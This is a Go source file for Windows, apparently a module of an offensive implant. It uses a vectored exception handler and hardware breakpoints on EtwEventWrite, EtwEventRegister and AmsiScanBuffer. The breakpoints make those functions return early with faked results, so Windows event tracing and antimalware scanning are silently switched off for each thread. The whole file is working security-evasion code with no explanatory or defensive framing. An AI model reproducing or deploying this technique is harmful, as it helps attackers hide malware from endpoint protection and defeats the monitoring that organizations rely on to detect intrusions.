//go:build windows

package main

import (
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
	"killa/pkg/commands"
)

var (
	kernel32AP = syscall.NewLazyDLL("kernel32.dll")
	procAddVectoredExceptionHandler = kernel32AP.NewProc("AddVectoredExceptionHandler")
)

var (
	etwEventWriteAddr    uintptr
	etwEventRegisterAddr uintptr
	amsiScanBufferAddr   uintptr
	vehHandle            uintptr
	hwbpInitialized      bool
)

const (
	EXCEPTION_SINGLE_STEP = 0x80000004
	EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF
	EXCEPTION_CONTINUE_SEARCH    = 0x0
)

// EXCEPTION_RECORD from winnt.h
type EXCEPTION_RECORD struct {
	ExceptionCode    uint32
	ExceptionFlags   uint32
	ExceptionRecord  *EXCEPTION_RECORD
	ExceptionAddress uintptr
	NumberParameters uint32
	ExceptionInformation [15]uintptr
}

// EXCEPTION_POINTERS from winnt.h
type EXCEPTION_POINTERS struct {
	ExceptionRecord *EXCEPTION_RECORD
	ContextRecord   *CONTEXT
}

// CONTEXT structure for x64
type M128A struct {
	Low  uint64
	High int64
}

type XMM_SAVE_AREA32 struct {
	ControlWord    uint16
	StatusWord     uint16
	TagWord        byte
	Reserved1      byte
	ErrorOpcode    uint16
	ErrorOffset    uint32
	ErrorSelector  uint16
	Reserved2      uint16
	DataOffset     uint32
	DataSelector   uint16
	Reserved3      uint16
	MxCsr          uint32
	MxCsr_Mask     uint32
	FloatRegisters [8]M128A
	XmmRegisters   [16]M128A
	Reserved4      [96]byte
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              XMM_SAVE_AREA32
	VectorRegister       [26]M128A
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

// VEH Handler callback
func vehHandler(exceptionInfo *EXCEPTION_POINTERS) uintptr {
	if exceptionInfo.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
		exceptionAddr := exceptionInfo.ExceptionRecord.ExceptionAddress

		isTarget := false
		var returnValue uint64 = 0

		if exceptionAddr != 0 {
			if exceptionAddr == etwEventWriteAddr || exceptionAddr == etwEventRegisterAddr {
				isTarget = true
				returnValue = 0 // STATUS_SUCCESS
			} else if exceptionAddr == amsiScanBufferAddr {
				isTarget = true
				returnValue = 0x80070057 // E_INVALIDARG
			}
		}

		if isTarget {
			// Simulate a return:
			// Read the return address from the stack
			rsp := exceptionInfo.ContextRecord.Rsp
			returnAddr := *(*uint64)(unsafe.Pointer(uintptr(rsp)))

			// Set RIP to the return address
			exceptionInfo.ContextRecord.Rip = returnAddr

			// Pop the return address off the stack
			exceptionInfo.ContextRecord.Rsp += 8

			// Set the return value
			exceptionInfo.ContextRecord.Rax = returnValue

			return EXCEPTION_CONTINUE_EXECUTION
		}
	}

	return EXCEPTION_CONTINUE_SEARCH
}

// autoStartupPatch sets up the VEH and resolves the addresses
func autoStartupPatch() {
	if hwbpInitialized {
		return
	}

	// Resolve addresses
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err == nil {
		if proc, err := ntdll.FindProc("EtwEventWrite"); err == nil {
			etwEventWriteAddr = proc.Addr()
		}
		if proc, err := ntdll.FindProc("EtwEventRegister"); err == nil {
			etwEventRegisterAddr = proc.Addr()
		}
	}

	amsi, err := syscall.LoadDLL("amsi.dll")
	if err == nil {
		if proc, err := amsi.FindProc("AmsiScanBuffer"); err == nil {
			amsiScanBufferAddr = proc.Addr()
		}
	}

	if etwEventWriteAddr == 0 && etwEventRegisterAddr == 0 && amsiScanBufferAddr == 0 {
		return // Nothing to hook
	}

	// Register VEH
	// First parameter 1 means CALL_FIRST (called before structured exception handlers)
	ret, _, _ := procAddVectoredExceptionHandler.Call(1, syscall.NewCallbackCDecl(vehHandler))
	vehHandle = ret

	hwbpInitialized = true

	// Pass the logic to commands package to be applied per-thread
	commands.ApplyHWBPToCurrentThread = SetCurrentThreadHWBP
}

// SetCurrentThreadHWBP applies HWBP context to the current thread.
func SetCurrentThreadHWBP() {
	if !hwbpInitialized {
		return
	}

	// Open current thread with THREAD_GET_CONTEXT | THREAD_SET_CONTEXT
	threadHandle := windows.CurrentThread()

	// CONTEXT struct is 1232 bytes, need 16-byte alignment
	buf := make([]byte, unsafe.Sizeof(CONTEXT{})+16)
	ctxPtr := uintptr(unsafe.Pointer(&buf[0]))
	// Align pointer to 16 bytes
	align := ctxPtr % 16
	if align != 0 {
		ctxPtr += 16 - align
	}
	ctx := (*CONTEXT)(unsafe.Pointer(ctxPtr))

	ctx.ContextFlags = 0x100010 // CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS

	// GetThreadContext
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procGetThreadContext := kernel32.NewProc("GetThreadContext")
	ret, _, _ := procGetThreadContext.Call(uintptr(threadHandle), ctxPtr)
	if ret == 0 {
		return
	}

	// Set HWBP logic
	dr7Mask := uint64(0)
	if etwEventWriteAddr != 0 {
		ctx.Dr0 = uint64(etwEventWriteAddr)
		dr7Mask |= 1 // Enable Dr0 (Local)
	}
	if etwEventRegisterAddr != 0 {
		ctx.Dr1 = uint64(etwEventRegisterAddr)
		dr7Mask |= 4 // Enable Dr1 (Local)
	}
	if amsiScanBufferAddr != 0 {
		ctx.Dr2 = uint64(amsiScanBufferAddr)
		dr7Mask |= 16 // Enable Dr2 (Local)
	}

	if dr7Mask != 0 {
		// Clear bits 0,2,4,6 then set our mask
		ctx.Dr7 = (ctx.Dr7 &^ 0x55) | dr7Mask

		// SetThreadContext
		procSetThreadContext := kernel32.NewProc("SetThreadContext")
		procSetThreadContext.Call(uintptr(threadHandle), ctxPtr)
	}
}
